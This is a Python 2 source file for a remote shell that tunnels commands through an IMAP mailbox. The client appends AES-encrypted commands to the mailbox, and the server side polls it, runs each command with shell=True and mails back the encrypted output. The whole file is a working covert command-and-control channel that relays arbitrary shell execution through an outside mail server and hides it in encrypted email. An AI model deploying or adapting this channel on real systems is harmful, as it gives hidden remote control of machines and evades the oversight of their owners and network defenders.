import sys
import StringIO
import subprocess

from config import imap_shell_config
from aes import imap_shell_aes
from sig import imap_shell_signal
from imap import imap_session

SHELL_MODE_NORMAL = 0
SHELL_MODE_BATCH = 1

def client_shell(session):
    session.search_ISSP(client_msg_callback)
    mode = SHELL_MODE_NORMAL
    PS = '>'
    print "%s " % PS,
    cmd = sys.stdin.readline()
    while cmd != "":
        cmd = cmd.rstrip()
        if mode == SHELL_MODE_NORMAL:
            if cmd == 'quit':
                break
            elif cmd == '':
                pass
            elif cmd == 'BEGIN BATCH':
                PS += '>'
                batch = ''
                mode = SHELL_MODE_BATCH
            else:
                session.append_ISCP(cmd)
                session.wait_ISSP(client_msg_callback)
        elif mode == SHELL_MODE_BATCH:
            if cmd == 'quit':
                break
            elif cmd == '':
                pass
            elif cmd == 'END BATCH':
                PS = PS[0:-1]
                mode = SHELL_MODE_NORMAL
                session.append_ISCP(batch)
                session.wait_ISSP(client_msg_callback)
            else:
                batch += cmd
                batch += "\n"
        else:
            raise Exception("Unspecified mode.")

        print "\r%s " % PS,
        cmd = sys.stdin.readline()

def client_msg_callback(uid, message):
    message = imap_shell_aes(config('encryption_passwd')).decrypt(message)
    print('\r%s' % message)


def server_batch(session):
    if session.search_ISCP(server_msg_callback):
        session.wait_ISCP(server_msg_callback)

def server_msg_callback(uid, message):
    message = imap_shell_aes(config('encryption_passwd')).decrypt(message)

    fp = StringIO.StringIO(message)
    ret = ''
    for cmd in fp:
        cmd = cmd.rstrip()
        ret += server_process_cmd(cmd)

    session.append_ISSP(ret)

def server_process_cmd(cmd):
    ret = "C: %s\n" % cmd
    ret += "S: "
    try:
        ret += subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except subprocess.CalledProcessError as e:
        ret += str(e)
    except:
        ret += "Unexpected error.\n"
    return ret


if __name__ == '__main__':
    config = imap_shell_config('config.ini')

    with imap_session({
            'addr'    : config('imap_address'),
            'port'    : config('imap_port'),
            'user'    : config('imap_user'),
            'passwd'  : config('imap_passwd'),
            'mailbox' : config('imap_shell_mailbox'),
            'encryption_passwd' : config('encryption_passwd'),
            'account' : config('email_account')}) as session:
        if '-s' in sys.argv:
            server_batch(session)
        else:
            client_shell(session)
